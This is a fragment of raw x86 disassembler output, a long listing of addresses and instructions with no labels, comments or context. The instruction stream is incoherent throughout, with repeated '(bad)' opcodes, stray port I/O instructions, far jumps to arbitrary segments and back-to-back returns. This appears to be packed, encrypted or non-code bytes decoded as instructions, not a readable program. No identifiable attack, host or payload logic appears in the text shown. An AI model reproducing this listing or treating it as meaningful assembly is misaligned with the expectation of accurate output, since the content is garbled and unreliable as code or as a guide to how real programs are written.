  41d7c9:	or     al,dl
  41d7cb:	outs   dx,BYTE PTR ds:[esi]
  41d7cc:	out    0x15,al
  41d7ce:	ins    BYTE PTR es:[edi],dx
  41d7cf:	push   0x68
  41d7d1:	push   ecx
  41d7d2:	add    al,BYTE PTR [esi]
  41d7d4:	loop   0x41d7d5
  41d7d6:	pop    ebx
  41d7d7:	(bad)  
  41d7d9:	int3   
  41d7da:	and    BYTE PTR [esi-0x57],ah
  41d7dd:	ret    
  41d7de:	push   esi
  41d7df:	push   ebp
  41d7e0:	aad    0xf8
  41d7e2:	mov    al,0xa2
  41d7e4:	sub    DWORD PTR [esi+0x25],edx
  41d7e7:	push   edi
  41d7e8:	retf   
  41d7e9:	in     al,dx
  41d7ea:	dec    esi
  41d7eb:	pop    eax
  41d7ed:	mov    ss,WORD PTR [ecx+eax*4]
  41d7f0:	aad    0x7e
  41d7f2:	pop    ebp
  41d7f3:	pushf  
  41d7f4:	les    ecx,FWORD PTR [edi-0x1e]
  41d7f7:	adc    BYTE PTR [ebp+0x19202e19],0x2b
  41d7fe:	xchg   ebp,eax
  41d7ff:	ret    
  41d800:	add    eax,0x739daf59
  41d805:	inc    ebp
  41d806:	ficom  DWORD PTR [ebx-0x13]
  41d809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d80a:	push   edx
  41d80b:	jl     0x41d7ef
  41d80d:	dec    ebp
  41d80e:	inc    esp
  41d80f:	test   DWORD PTR [ecx],0x701fa443
  41d815:	adc    dl,dh
  41d817:	fsubr  st(2),st
  41d819:	pop    ebx
  41d81a:	push   ds
  41d81b:	inc    esi
  41d81c:	das    
  41d81d:	push   esp
  41d81e:	fsub   DWORD PTR [edx+eax*1-0x30020a56]
  41d825:	outs   dx,DWORD PTR ds:[esi]
  41d826:	add    al,0x5b
  41d828:	add    ch,0xd
  41d82b:	(bad)  [ebx]
  41d82d:	out    dx,eax
  41d82e:	inc    eax
  41d82f:	test   eax,0xa5930e99
  41d834:	pusha  
  41d835:	pop    es
  41d836:	scas   al,BYTE PTR es:[edi]
  41d837:	js     0x41d85c
  41d839:	xor    al,0xc
  41d83b:	icebp  
  41d83c:	ret    0x869a
  41d83f:	dec    esp
  41d840:	mov    BYTE PTR [eax-0x5e],0xd1
  41d844:	stc    
  41d845:	mov    esi,0xf7bd01fa
  41d84a:	ret    0xc0b
  41d84d:	mov    cl,0xc9
  41d84f:	fcomp  QWORD PTR [ebp+0x4b54fe28]
  41d855:	inc    ebx
  41d856:	or     edi,DWORD PTR [esi+0x57]
  41d859:	mov    DWORD PTR [ebx],ebx
  41d85b:	ja     0x41d86e
  41d85d:	hlt    
  41d85e:	jnp    0x41d83f
  41d860:	(bad)  
  41d861:	icebp  
  41d862:	mov    edx,0xfd32bf22
  41d867:	cmp    BYTE PTR [eax+0x1c226fa6],dl
  41d86d:	shr    BYTE PTR [eax+0x68322a97],cl
  41d873:	push   ss
  41d874:	adc    al,0xbd
  41d876:	loope  0x41d864
  41d878:	mov    esi,0x21eb4015
  41d87d:	in     al,dx
  41d87e:	and    DWORD PTR [eax-0x7fac3181],0xffffffcc
  41d885:	rol    DWORD PTR [ecx],cl
  41d887:	inc    esp
  41d888:	ds xchg ebx,eax
  41d88a:	xor    dl,bl
  41d88c:	pop    es
  41d88d:	loop   0x41d89e
  41d88f:	mov    ebp,DWORD PTR [ebp+0x185d3f3b]
  41d895:	scas   eax,DWORD PTR es:[edi]
  41d896:	lods   al,BYTE PTR ds:[esi]
  41d897:	adc    al,0x46
  41d899:	mov    ch,0xd3
  41d89b:	loop   0x41d87d
  41d89d:	pop    es
  41d89e:	imul   BYTE PTR ds:0xdf422222
  41d8a4:	mov    DWORD PTR [edi+0x742d1aa2],ebp
  41d8aa:	imul   esi,DWORD PTR [ecx+0x26],0x50
  41d8ae:	mov    eax,ds:0xef1b5bd2
  41d8b3:	pushf  
  41d8b4:	aaa    
  41d8b5:	jnp    0x41d8ac
  41d8b7:	and    ah,bh
  41d8b9:	xchg   esp,eax
  41d8ba:	pop    ebp
  41d8bb:	stos   DWORD PTR es:[edi],eax
  41d8bc:	out    dx,al
  41d8bd:	shl    DWORD PTR [edi-0x65bf9d25],1
  41d8c3:	sbb    al,0xd3
  41d8c5:	mov    WORD PTR [edx+0x469a96c7],?
  41d8cb:	ss out 0xdf,al
  41d8ce:	aam    0xb8
  41d8d0:	jle    0x41d8c0
  41d8d2:	jl     0x41d94e
  41d8d4:	jbe    0x41d8de
  41d8d6:	int    0x81
  41d8d8:	call   0xcce5:0xbf927bd2
  41d8df:	mov    esi,0x6073b88d
  41d8e4:	dec    edi
  41d8e5:	sti    
  41d8e6:	jns    0x41d906
  41d8e8:	mov    edx,0xa1e12065
  41d8ed:	mov    ds:0xc61f4ba6,eax
  41d8f2:	cmp    al,BYTE PTR [esi+0x39]
  41d8f5:	test   BYTE PTR [esi+0x476fdb04],bl
  41d8fb:	test   eax,0x11d930a
  41d900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d901:	sar    DWORD PTR [esi-0x5d],1
  41d904:	adc    eax,0xc3ea3828
  41d909:	xchg   edx,eax
  41d90a:	cld    
  41d90b:	dec    esp
  41d90c:	(bad)  
  41d90d:	js     0x41d894
  41d90f:	fs das 
  41d911:	loope  0x41d943
  41d913:	mov    gs,WORD PTR [edx-0x16ca37e8]
  41d919:	out    0xb3,eax
  41d91b:	mov    al,ds:0x35e440a1
  41d920:	out    0x96,al
  41d922:	ret    0xdb33
  41d925:	mov    eax,ds:0x8da24505
  41d92a:	div    DWORD PTR [ebp+0x33]
  41d92d:	(bad)  
  41d92f:	loope  0x41d8e2
  41d931:	xor    ah,dh
  41d933:	sahf   
  41d934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d935:	test   eax,0x8e56e6bb
  41d93a:	shl    DWORD PTR [edx+0x44],cl
  41d93d:	adc    BYTE PTR [esi],ah
  41d93f:	loop   0x41d936
  41d941:	dec    eax
  41d942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d943:	xor    BYTE PTR [bx-0x14],dl
  41d947:	aas    
  41d948:	outs   dx,BYTE PTR ds:[esi]
  41d949:	sbb    eax,0x21
  41d94c:	fiadd  WORD PTR [edi]
  41d94e:	outs   dx,BYTE PTR ds:[esi]
  41d94f:	mov    DWORD PTR [ebx],0xc4f639e4
  41d955:	mov    ebx,0xa27b0f4c
  41d95a:	xchg   esi,eax
  41d95b:	out    dx,al
  41d95c:	xchg   BYTE PTR [ebp+0x12],dl
  41d95f:	xchg   DWORD PTR [eax-0x4f109de6],edi
  41d965:	fcomip st,st(3)
  41d967:	(bad)  
  41d968:	mov    esp,0xbaa6ca0f
  41d96d:	mov    ?,WORD PTR [ebx-0x57]
  41d970:	adc    BYTE PTR [eax-0xe],bh
  41d973:	cdq    
  41d974:	in     eax,dx
  41d975:	push   0xd20189a6
  41d97a:	adc    DWORD PTR cs:[edx],ebp
  41d97d:	jo     0x41d9f3
  41d97f:	mul    BYTE PTR ds:0x736be22b
  41d985:	jge    0x41d941
  41d987:	mov    dh,0xcf
  41d989:	push   edi
  41d98a:	cwde   
  41d98b:	cli    
  41d98c:	add    bh,BYTE PTR [ecx-0x6]
  41d98f:	adc    eax,0xf2ee2dd6
  41d994:	jae    0x41d98a
  41d996:	cli    
  41d997:	inc    eax
  41d998:	push   cs
  41d999:	je     0x41d94f
  41d99b:	and    eax,0x6cca0c82
  41d9a0:	jb     0x41d949
  41d9a2:	xchg   ebp,eax
  41d9a3:	mov    WORD PTR [ecx-0x37],ss
  41d9a6:	cdq    
  41d9a7:	or     al,0xa8
  41d9a9:	inc    esi
  41d9aa:	ss dec ebx
  41d9ac:	push   ebp
  41d9ad:	mov    BYTE PTR [eax-0x2ad76a55],cl
  41d9b3:	ficomp DWORD PTR ds:0x630953f1
  41d9b9:	jmp    0x869ccf8c
  41d9be:	mov    al,ds:0xfa30a65f
  41d9c3:	push   ebx
  41d9c4:	jbe    0x41d958
  41d9c6:	xor    al,0x92
  41d9c8:	xor    BYTE PTR [bx+0x6f56],0x1d
  41d9ce:	add    eax,eax
  41d9d0:	push   0x15e62432
  41d9d5:	mov    eax,DWORD PTR [ecx+eax*4+0x4b744a5c]
  41d9dc:	xchg   edx,eax
  41d9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9de:	jmp    0x41d9c0
  41d9e0:	aas    
  41d9e1:	(bad)  
  41d9e2:	dec    ebp
  41d9e3:	fwait
  41d9e4:	test   DWORD PTR [eax+0x51],ebx
  41d9e7:	mov    edi,ecx
  41d9e9:	call   0x3bd:0xe56602e1
  41d9f0:	shl    DWORD PTR [eax],0x30
  41d9f3:	into   
  41d9f4:	sub    ebx,DWORD PTR [eax-0x7997c71c]
  41d9fa:	sahf   
  41d9fb:	cli    
  41d9fc:	inc    ecx
  41d9fd:	test   al,0x3b
  41d9ff:	xor    edx,DWORD PTR [ecx-0x23]
  41da02:	add    edx,DWORD PTR [eax+eiz*8-0x758e4adb]
  41da09:	cmp    BYTE PTR [edx-0x21],0x61
  41da0d:	pop    esp
  41da0e:	rcr    BYTE PTR [ebp+0x4ca7b25a],1
  41da14:	jmp    0xcedae5f0
  41da19:	jns    0x41da35
  41da1b:	call   0xfd97:0xf7fdc64a
  41da22:	es hlt 
  41da24:	not    BYTE PTR [ecx]
  41da26:	das    
  41da27:	mov    ah,0xa7
  41da29:	lds    ebp,FWORD PTR [ebx]
  41da2b:	outs   dx,BYTE PTR ds:[esi]
  41da2c:	fdiv   QWORD PTR [ebx-0x56838df8]
  41da32:	add    bh,bh
  41da34:	lods   eax,DWORD PTR ds:[esi]
  41da35:	mov    DWORD PTR [edi],edi
  41da37:	mov    esp,0xff5369ad
  41da3c:	inc    BYTE PTR [eax+0x4bce98fd]
  41da42:	jecxz  0x41da92
  41da44:	cld    
  41da45:	into   
  41da46:	push   ecx
  41da47:	or     al,0xc4
  41da49:	repnz lods eax,DWORD PTR ds:[esi]
  41da4b:	lods   eax,DWORD PTR ds:[esi]
  41da4c:	inc    ebp
  41da4d:	inc    eax
  41da4e:	out    dx,al
  41da4f:	mov    ebx,0x34db7f4c
  41da54:	clc    
  41da55:	call   0x3190:0xed58e478
  41da5c:	lods   al,BYTE PTR ds:[esi]
  41da5d:	or     BYTE PTR [eax],dh
  41da5f:	test   BYTE PTR [edx-0x78],al
  41da62:	jbe    0x41da0d
  41da64:	jle    0x41da92
  41da66:	aas    
  41da67:	mov    edx,0x284c3b15
  41da6c:	mov    ebp,0xfab80744
  41da71:	xchg   BYTE PTR [si-0x423a],dl
  41da76:	add    BYTE PTR [edx-0x62dc3b25],0xa0
  41da7d:	and    ch,BYTE PTR [ebx+0x2f]
  41da80:	lea    edi,[ebx]
  41da82:	repnz hlt 
  41da84:	in     al,dx
  41da85:	popa   
  41da86:	scas   al,BYTE PTR es:[edi]
  41da87:	int3   
  41da88:	inc    edx
  41da89:	lods   al,BYTE PTR ds:[esi]
  41da8a:	ja     0x41dae3
  41da8c:	jmp    0x41dae3
  41da8e:	fldcw  WORD PTR [ecx-0x95cbac]
  41da94:	jne    0x41da26
  41da96:	add    bl,BYTE PTR [edx-0x7bc9a35f]
  41da9c:	lock push ds
  41da9e:	and    DWORD PTR [ebp-0x7],esi
  41daa1:	jmp    0xa8ff:0xda366e21
  41daa8:	cli    
  41daa9:	loope  0x41db10
  41daab:	mov    dh,0x80
  41daad:	(bad)  
  41daae:	jecxz  0x41da58
  41dab0:	sub    eax,0x388bd6a9
  41dab5:	jecxz  0x41dacb
  41dab7:	pmaddwd mm3,QWORD PTR [ecx+0x62]
  41dabb:	and    BYTE PTR [eax+0x36485d5a],bh
  41dac1:	test   eax,0x926cbac3
  41dac6:	cs dec esp
  41dac8:	or     al,0x89
  41daca:	es inc esi
  41dacc:	sbb    al,0xc1
  41dace:	mov    dh,ch
  41dad0:	gs ins BYTE PTR es:[edi],dx
  41dad2:	xchg   edx,eax
  41dad3:	cdq    
  41dad4:	repz inc esp
  41dad6:	jb     0x41db0f
  41dad8:	jp     0x41dad9
  41dada:	gs popa 
  41dadc:	mov    edx,0x20051a
  41dae1:	xlat   BYTE PTR ds:[ebx]
  41dae2:	rol    ch,1
  41dae4:	cmc    
  41dae5:	cwde   
  41dae6:	std    
  41dae7:	cmp    cl,BYTE PTR [edi]
  41dae9:	push   ebp
  41daea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daeb:	stos   BYTE PTR es:[edi],al
  41daec:	pushf  
  41daed:	inc    ebp
  41daee:	xchg   ebx,eax
  41daef:	or     DWORD PTR [ecx-0x20],esi
  41daf2:	push   ebx
  41daf3:	xchg   BYTE PTR [edx-0xb2f207e],al
  41daf9:	xor    BYTE PTR [ecx+0x22],0x1d
  41dafd:	adc    eax,0xb0ea02a8
  41db02:	dec    esp
  41db03:	add    eax,0x4e478c4a
  41db08:	aad    0x8f
  41db0a:	push   esi
  41db0b:	jns    0x41db71
  41db0d:	retf   
  41db0e:	dec    ebx
  41db0f:	dec    edx
  41db10:	cs pushf 
  41db12:	ror    DWORD PTR [ebp-0x67],0xf9
  41db16:	add    al,0x31
  41db18:	pop    esp
  41db19:	cmp    bl,BYTE PTR [eax-0x9fef79d]
  41db1f:	in     eax,dx
  41db20:	repz addr16 adc al,0x31
  41db24:	push   0x2e6dc1fc
  41db29:	fisub  WORD PTR [ecx+edi*2-0x22e38717]
  41db30:	iret   
  41db31:	sar    BYTE PTR [eax],1
  41db33:	dec    ebp
  41db34:	inc    ebp
  41db35:	inc    edi
  41db36:	jmp    0x41daf2
  41db38:	cs js  0x41dba5
  41db3b:	rcr    DWORD PTR [eax-0x62d74697],0x1f
  41db42:	and    eax,0xb1630990
  41db47:	(bad)  
  41db49:	test   al,0xa2
  41db4b:	out    dx,eax
  41db4c:	cli    
  41db4d:	ja     0x41dbab
  41db4f:	push   ecx
  41db50:	leave  
  41db51:	mov    dl,bh
  41db53:	mov    al,0x58
  41db55:	ret    
  41db56:	cmp    esp,DWORD PTR ds:0x40823ee5
  41db5c:	mov    ah,0x1a
  41db5e:	daa    
  41db5f:	aaa    
  41db60:	xor    eax,0xe7a3b854
  41db65:	retf   
  41db66:	pusha  
  41db67:	cmp    eax,0x87f3f834
  41db6c:	fcmovnu st,st(0)
  41db6e:	adc    al,0xd9
  41db70:	sub    eax,0x92faedb
  41db75:	xchg   BYTE PTR [eax+0x13519bae],dh
  41db7b:	clc    
  41db7c:	jmp    0xb99f75b9
  41db81:	repnz inc eax
  41db83:	cmp    eax,0xbe8967f0
  41db88:	dec    ebp
  41db89:	mov    cl,0xcc
  41db8b:	adc    eax,0x2683d886
  41db90:	es adc al,0xb
  41db93:	add    esp,DWORD PTR [ebp+ecx*1-0x6]
  41db97:	gs out 0xd9,eax
  41db9a:	add    al,0x93
  41db9c:	push   es
  41db9d:	cwde   
  41db9e:	stc    
  41db9f:	jmp    FWORD PTR [ebp-0x2d]
  41dba2:	jb     0x41db2d
  41dba4:	call   FWORD PTR [edi]
  41dba6:	jecxz  0x41db9f
  41dba8:	test   BYTE PTR [edi-0x1d],bh
  41dbab:	cmp    DWORD PTR [esi-0x7a76d1f7],esi
  41dbb1:	out    0x2d,eax
  41dbb3:	push   cs
  41dbb4:	mov    esp,0xc0442ef3
  41dbb9:	xchg   edx,eax
  41dbba:	push   0xffffffb3
  41dbbc:	enter  0xea06,0x9c
  41dbc0:	pushf  
  41dbc1:	arpl   WORD PTR [ebp-0xf60e261],ax
  41dbc7:	sbb    ch,ch
  41dbc9:	in     eax,dx
  41dbca:	dec    ebx
  41dbcb:	push   ds
  41dbcc:	sbb    DWORD PTR [esi],esp
  41dbce:	mov    esp,0x234da5e4
  41dbd3:	(bad)  
  41dbd4:	out    0x85,eax
  41dbd6:	inc    eax
  41dbd7:	stc    
  41dbd8:	out    dx,eax
  41dbd9:	sbb    DWORD PTR [ecx+0x6d40c282],esp
  41dbdf:	sbb    ecx,DWORD PTR [eax-0x11]
  41dbe2:	push   ss
  41dbe3:	call   0xf638f4e5
  41dbe8:	mov    bl,0xc5
  41dbea:	rcr    BYTE PTR [esi+0x7c16411a],1
  41dbf0:	nop
  41dbf1:	bound  eax,QWORD PTR [ecx-0x370ae253]
  41dbf7:	mov    edi,DWORD PTR [ebx+0x11ad33ea]
  41dbfd:	dec    eax
  41dbfe:	mov    ebp,0xac8b7372
  41dc03:	nop
  41dc04:	scas   eax,DWORD PTR es:[edi]
  41dc05:	cs pop ebx
  41dc07:	ret    
  41dc08:	cwde   
  41dc09:	sub    DWORD PTR [ebx+0x32],esi
  41dc0c:	in     al,0xde
  41dc0e:	ins    BYTE PTR es:[edi],dx
  41dc0f:	sbb    DWORD PTR [ebx+esi*4],0x57
  41dc13:	cmp    bl,BYTE PTR [edx-0x49c85f84]
  41dc19:	pop    edx
  41dc1a:	je     0x41dc92
  41dc1c:	shl    al,0x26
  41dc1f:	mov    al,0x6b
  41dc21:	xor    DWORD PTR [edi+0x57],ebx
  41dc24:	adc    DWORD PTR [ebp+0x10771ece],edx
  41dc2a:	cmp    edx,DWORD PTR [edx-0x79]
  41dc2d:	mov    esi,0x41ec0484
  41dc32:	mov    dl,0xc9
  41dc34:	sub    al,0x9d
  41dc36:	rcl    DWORD PTR [edi+0x2acf7915],1
  41dc3c:	dec    esp
  41dc3d:	and    BYTE PTR [ebx-0x7e],bh
  41dc40:	cli    
  41dc41:	add    BYTE PTR [edx],dl
  41dc43:	pop    ds
  41dc44:	push   ecx
  41dc45:	pop    ebx
  41dc46:	pop    ebp
  41dc47:	adc    eax,0x886a8219
  41dc4c:	in     al,0xa0
  41dc4e:	add    edi,DWORD PTR [eax+0x40]
  41dc51:	test   eax,ebx
  41dc53:	inc    ecx
  41dc54:	popa   
  41dc55:	dec    ecx
  41dc56:	js     0x41dc8b
  41dc58:	es mov esp,0xfa156edc
  41dc5e:	lds    edx,FWORD PTR [eax+0x464bb9fb]
  41dc64:	imul   ebp,DWORD PTR [ebp-0x65],0xffffffef
  41dc68:	ins    DWORD PTR es:[edi],dx
  41dc69:	in     al,dx
  41dc6a:	push   ecx
  41dc6b:	sub    ch,BYTE PTR [edx-0x17]
  41dc6e:	dec    ebp
  41dc6f:	jbe    0x41dc75
  41dc71:	cwde   
  41dc72:	sar    al,0x6
  41dc75:	sti    
  41dc76:	(bad)  
  41dc77:	xchg   edi,eax
  41dc78:	call   0xd76f:0xd1651428
  41dc7f:	add    dl,cl
  41dc81:	gs loop 0x41dc4a
  41dc84:	sub    eax,0xfdfa08e2
  41dc89:	gs pop esi
  41dc8b:	stos   DWORD PTR es:[edi],eax
  41dc8c:	dec    edi
  41dc8d:	mov    ebp,0x46c5e904
  41dc92:	mov    bh,BYTE PTR [ebp-0x51]
  41dc95:	add    eax,0x9e0b634d
  41dc9a:	popf   
  41dc9b:	mov    esi,0xe9de4d15
  41dca0:	outs   dx,BYTE PTR ds:[esi]
  41dca1:	dec    edx
  41dca2:	inc    esi
  41dca3:	ins    DWORD PTR es:[edi],dx
  41dca4:	add    eax,0x7b0fb5de
  41dca9:	rcl    DWORD PTR [ebp-0x4e507e56],1
  41dcaf:	inc    edi
  41dcb0:	loopne 0x41dcbd
  41dcb2:	mov    BYTE PTR [edx+0x1760857],0xe8
  41dcb9:	lea    edi,[ebp+0x23439ea5]
  41dcbf:	adc    edx,DWORD PTR [eax]
  41dcc1:	xor    ecx,edx
  41dcc3:	stos   DWORD PTR es:[edi],eax
  41dcc4:	dec    edi
  41dcc5:	mov    eax,0xf3c888af
  41dcca:	imul   esi,edx,0xffffffc2
  41dccd:	sub    al,0x21
  41dccf:	loopne 0x41dc94
  41dcd1:	test   ah,dh
  41dcd3:	or     BYTE PTR [ecx+0xcab3406],cl
  41dcd9:	or     eax,0xc06756c0
  41dcde:	adc    ch,BYTE PTR [esi]
  41dce0:	or     al,ch
  41dce2:	cmp    eax,0xca9bcf8f
  41dce7:	mov    ch,ch
  41dce9:	jb     0x41dcc0
  41dceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcec:	nop
  41dced:	dec    eax
  41dcee:	rcl    dl,0x78
  41dcf1:	or     esi,DWORD PTR [esi+0x64c0c7cb]
  41dcf7:	sub    eax,0xe83c4975
  41dcfc:	repz sbb bh,BYTE PTR [ecx+0x229b64cf]
  41dd03:	jne    0x41dcec
  41dd05:	pop    edx
  41dd06:	ins    DWORD PTR es:[edi],dx
  41dd07:	xchg   edi,eax
  41dd08:	mov    ds:0xbe6c9343,al
  41dd0d:	fwait
  41dd0e:	ins    DWORD PTR es:[edi],dx
  41dd0f:	xchg   ecx,eax
  41dd10:	xchg   edx,eax
  41dd11:	dec    ebx
  41dd12:	sub    eax,0xf12d8125
  41dd17:	ret    0xebbe
  41dd1a:	je     0x41dd72
  41dd1c:	mov    ebx,0x562b0fc8
  41dd21:	xor    al,0xa1
  41dd23:	popa   
  41dd24:	lea    eax,[esi]
  41dd26:	fcom   QWORD PTR [edi+0x5]
  41dd29:	pop    ebp
  41dd2a:	scas   eax,DWORD PTR es:[edi]
  41dd2b:	sahf   
  41dd2c:	pusha  
  41dd2d:	xor    bl,BYTE PTR [esi+ecx*8-0x7]
  41dd31:	xor    dl,BYTE PTR cs:[ebp-0x38]
  41dd35:	inc    esi
  41dd36:	adc    DWORD PTR [esi+0x6a],ebx
  41dd39:	push   ecx
  41dd3a:	leave  
  41dd3b:	and    al,0xd5
  41dd3d:	gs (bad) gs:[ebx-0x476e98b1]
  41dd45:	and    al,0x9c
  41dd47:	stos   BYTE PTR es:[edi],al
  41dd48:	call   FWORD PTR [ebx+ebp*1+0x6f1449fb]
  41dd4f:	out    dx,eax
  41dd50:	in     al,0x4c
  41dd52:	ret    0xc6ea
  41dd55:	rcr    ecx,cl
  41dd57:	dec    ecx
  41dd58:	sbb    DWORD PTR [esi-0x1a],ebp
  41dd5b:	xor    DWORD PTR [esi+edi*8+0x63099011],ebp
  41dd62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd63:	jge    0x41ddc7
  41dd65:	popf   
  41dd66:	mov    dl,0x97
  41dd68:	sbb    ebx,DWORD PTR [edi-0x32f7aa65]
  41dd6e:	pop    edx
  41dd6f:	test   eax,0x5ec947a9
  41dd74:	and    al,0x2f
  41dd76:	repz imul eax,DWORD PTR [ecx-0x20d386b8],0xffffff8a
  41dd7e:	cwde   
  41dd7f:	push   cs
  41dd80:	fisttp DWORD PTR [ebx]
  41dd82:	mov    bl,0xe9
  41dd84:	fsin   
  41dd86:	xor    eax,0xf6dc1f80
  41dd8b:	add    dh,BYTE PTR [ebx]
  41dd8d:	cmp    DWORD PTR [edi+0x6f15f740],edx
  41dd93:	push   esi
  41dd94:	es dec ecx
  41dd96:	xor    BYTE PTR [esp+edx*8-0x74],0xe
  41dd9b:	arpl   WORD PTR [esi+0x3bae43c],sp
  41dda1:	mov    eax,ds:0x888b023d
  41dda6:	mov    BYTE PTR [esi+edi*2+0x79ddb3ee],bh
  41ddad:	icebp  
  41ddae:	mov    ecx,0x268218d7
  41ddb3:	push   es
  41ddb4:	ins    BYTE PTR es:[edi],dx
  41ddb5:	ret    0x717f
  41ddb8:	jl     0x41ddc4
  41ddba:	retf   
  41ddbb:	dec    edi
  41ddbc:	jb     0x41dd72
  41ddbe:	js     0x41dd68
  41ddc0:	mov    esp,0xcdabca62
  41ddc5:	std    
  41ddc6:	mov    eax,ds:0x7b6bff22
  41ddcb:	lea    edi,[edi-0x3e]
  41ddce:	lods   al,BYTE PTR ds:[esi]
  41ddcf:	sub    DWORD PTR [eax+0x2],esi
  41ddd2:	xchg   edi,eax
  41ddd3:	(bad)  
  41ddd4:	(bad)  
  41ddd5:	aaa    
  41ddd6:	xchg   esp,eax
  41ddd7:	lods   al,BYTE PTR ds:[esi]
  41ddd8:	out    0xb4,al
  41ddda:	jae    0x41de4e
  41dddc:	sbb    ebp,esp
  41ddde:	in     al,0x51
  41dde0:	cld    
  41dde1:	push   esp
  41dde2:	pop    edi
  41dde3:	xchg   ebp,eax
  41dde4:	jnp    0x41de13
  41dde6:	push   ecx
  41dde7:	inc    esi
  41dde8:	ret    
  41dde9:	push   0xe9aef9a2
  41ddee:	mov    ch,0xed
  41ddf0:	inc    ebx
  41ddf1:	fisttp QWORD PTR [eax]
  41ddf3:	or     esi,esi
  41ddf5:	cmp    BYTE PTR [ecx+0x2],ch
  41ddf8:	cmc    
  41ddf9:	add    al,ah
  41ddfb:	cwde   
  41ddfc:	retf   
  41ddfd:	xor    dl,ah
  41ddff:	mov    WORD PTR [ebp+0x21],ss
  41de02:	inc    edx
  41de03:	inc    DWORD PTR [edx+0x53]
  41de06:	std    
  41de07:	and    cl,ch
  41de09:	ins    BYTE PTR es:[edi],dx
  41de0a:	and    eax,DWORD PTR [eax]
  41de0c:	popa   
  41de0d:	pop    edx
  41de0e:	mov    WORD PTR [ebp-0x10],cs
  41de11:	in     al,dx
  41de12:	fsub   QWORD PTR [eax+0x671011a5]
  41de18:	jmp    0x5ae6:0x3dacb402
  41de1f:	cld    
  41de20:	jne    0x41ddea
  41de22:	xchg   ebx,eax
  41de23:	cmp    eax,0xf1faf6b9
  41de28:	mov    WORD PTR [edx-0x6a127f2a],?
  41de2e:	cwde   
  41de2f:	in     eax,0xca
  41de31:	(bad)  
  41de32:	jp     0x41de69
  41de34:	(bad)  
  41de35:	sub    DWORD PTR [edi],esp
  41de37:	adc    DWORD PTR [edx-0x2814e976],edi
  41de3d:	bound  edi,QWORD PTR [edi]
  41de3f:	push   esi
  41de40:	add    BYTE PTR [edi-0x10faaeb1],dl
  41de46:	adc    eax,0xeee4555
  41de4b:	pop    es
  41de4c:	imul   ebp,DWORD PTR [esp+esi*2+0xc1f6d8e],0xdac4c32b
  41de57:	and    DWORD PTR [edx-0x34],esi
  41de5a:	push   esi
  41de5b:	repnz or DWORD PTR [di-0x5c],0xe7268cf3
  41de64:	xor    DWORD PTR [eax-0x3b],0xfffffff1
  41de68:	(bad)  [ebp+0x1a797f70]
  41de6e:	push   edx
  41de6f:	cmp    esp,DWORD PTR [edx]
  41de71:	pop    ds
  41de72:	sub    BYTE PTR [edi-0x8],bl
  41de75:	inc    edx
  41de76:	fisttp DWORD PTR [ebp-0x5b3b982b]
  41de7c:	out    0xa,eax
  41de7e:	loop   0x41de1c
  41de80:	push   esi
  41de81:	lock into 
  41de83:	pop    eax
  41de84:	xchg   BYTE PTR [edx+0x42f90ebe],bl
  41de8a:	and    eax,0xa1442f9e
  41de8f:	jge    0x41de7d
  41de91:	push   esi
  41de92:	stos   DWORD PTR es:[edi],eax
  41de93:	hlt    
  41de94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de95:	mov    dl,0x7b
  41de97:	fistp  QWORD PTR [eax]
  41de99:	pop    ebx
  41de9a:	add    eax,0x6b1e962d
  41de9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dea0:	mov    dh,0x52
  41dea2:	jecxz  0x41de43
  41dea4:	shl    ecx,1
  41dea6:	sbb    al,0xfc
  41dea8:	push   ebx
  41dea9:	scas   eax,DWORD PTR es:[edi]
  41deaa:	jmp    0x12da:0x2636b33d
  41deb1:	mov    al,0x87
  41deb3:	push   ebp
  41deb4:	mov    al,ds:0xf739016
  41deb9:	aam    0x43
  41debb:	sub    DWORD PTR [edx-0x223acf51],ebp
  41dec1:	scas   eax,DWORD PTR es:[edi]
  41dec2:	sub    DWORD PTR [ebx-0x1f],ebx
  41dec5:	sar    DWORD PTR [eax],1
  41dec7:	inc    ebp
  41dec8:	mov    dh,BYTE PTR [esi-0x5171c94]
  41dece:	push   ss
  41decf:	lea    ebx,[esp+eiz*4]
  41ded2:	add    al,0xc1
  41ded4:	repnz addr16 in eax,0xec
  41ded8:	in     eax,0x90
  41deda:	popf   
  41dedb:	dec    ebx
  41dedc:	sbb    al,0xcb
  41dede:	jmp    0x536e707f
  41dee3:	rcl    ah,0x65
  41dee6:	rcr    BYTE PTR [esi],1
  41dee8:	lea    ax,[ebp-0x12]
  41deec:	neg    BYTE PTR [ebx-0x15002854]
  41def2:	adc    esi,ebp
  41def4:	dec    ebp
  41def5:	mov    dh,0x4f
  41def7:	scas   al,BYTE PTR es:[edi]
  41def8:	mov    esi,0xadbe9eb2
  41defd:	loope  0x41defa
  41deff:	add    DWORD PTR [edx+esi*8-0x2],0xd195014b
  41df07:	paddb  mm1,QWORD PTR [esi-0x317da9a9]
  41df0e:	mov    ds:0xa1905a09,eax
  41df13:	gs mov bl,0xd3
  41df16:	aad    0x49
  41df18:	aas    
  41df19:	dec    esi
  41df1a:	inc    ebp
  41df1b:	imul   esi,DWORD PTR [ebx],0xddacde28
  41df21:	dec    ecx
  41df22:	dec    ebp
  41df23:	test   BYTE PTR [esi-0x6ff8d156],ah
  41df29:	xor    esi,eax
  41df2b:	lahf   
  41df2c:	and    DWORD PTR ds:0x26a396f4,0xffffffb9
  41df33:	sbb    ebp,DWORD PTR [eax*8+0x2838f57f]
  41df3a:	adc    bh,ah
  41df3c:	adc    esp,DWORD PTR [ecx-0x4937879f]
  41df42:	popf   
  41df43:	xor    BYTE PTR [edx],cl
  41df45:	adc    ch,dh
  41df47:	cdq    
  41df48:	xchg   edx,eax
  41df49:	repnz in eax,dx
  41df4b:	or     al,0x18
  41df4d:	add    DWORD PTR [ebp-0xa],ebp
  41df50:	sub    BYTE PTR [eax+ecx*2-0x40175c36],0xbc
  41df58:	xor    DWORD PTR [ecx-0x32],ecx
  41df5b:	ins    DWORD PTR es:[edi],dx
  41df5c:	imul   eax,DWORD PTR [ebp+0x68],0x51
  41df60:	adc    al,0x57
  41df62:	retf   
